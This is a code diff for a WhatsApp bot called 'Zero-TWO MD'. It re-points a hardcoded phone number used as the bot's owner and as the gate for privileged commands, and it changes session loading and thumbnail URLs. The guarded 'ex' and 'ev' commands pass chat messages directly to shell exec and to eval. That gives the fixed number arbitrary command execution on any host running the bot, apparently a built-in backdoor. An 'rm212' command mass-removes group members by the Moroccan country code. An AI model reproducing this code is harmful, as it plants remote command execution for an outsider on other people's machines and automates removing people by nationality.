@@ -20,14 +20,14 @@ const { File } = require('megajs')
 const path = require('path')
 const msgRetryCounterCache = new NodeCache()
 const prefix = '.'
-const ownerNumber = ['94762898541']
+const ownerNumber = ['94787351423']
 const l = console.log
 var { updateCMDStore,isbtnID,getCMDStore,getCmdForCmdId,connectdb,input,get,updb,updfb } = require("./lib/database")
 
 //===================SESSION============================
 if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
   if (config.SESSION_ID) {
-  const sessdata = config.SESSION_ID.replace("ZEROTWO=","")
+  const sessdata = config.SESSION_ID;
   const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
   filer.download((err, data) => {
     if (err) throw err
@@ -141,7 +141,7 @@ title: '𝗭𝗲𝗿𝗼-𝗧𝗪𝗢 𝗠𝗗 🍭',
 body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
 mediaType: 1,
 sourceUrl: "https://zerotwomd.me/" ,
-thumbnailUrl: 'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg' ,
+thumbnailUrl: 'https://i.ibb.co/ZRCcNkpQ/6193.jpg' ,
 renderLargerThumbnail: false,
 showAdAttribution: true
 }
@@ -358,7 +358,7 @@ title: '𝗭𝗲𝗿𝗼-𝗧𝗪𝗢 𝗠𝗗 🍭',
 body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
 mediaType: 1,
 sourceUrl: "https://zerotwomd.me/" ,
-thumbnailUrl: 'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg' ,
+thumbnailUrl: 'https://i.ibb.co/ZRCcNkpQ/6193.jpg' ,
 renderLargerThumbnail: false,
 showAdAttribution: true
 }
@@ -516,7 +516,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94762898541) {
+      if(senderNumber == 94787351423) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -528,7 +528,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94762898541) {
+      if(senderNumber == 94787351423) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
@@ -549,7 +549,7 @@ switch (command) {
     }
     break
     case'rm212':{
-      if(senderNumber == 94762898541) {
+      if(senderNumber == 94787351423) {
         for (let i=0;i<participants.length;i++) {
           if(participants[i].id.startsWith("212")){
        await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
@@ -563,7 +563,7 @@ console.log(dsa)
     }
     break
   case 'ev': {
-    if(senderNumber == 94762898541) {
+    if(senderNumber == 94787351423) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
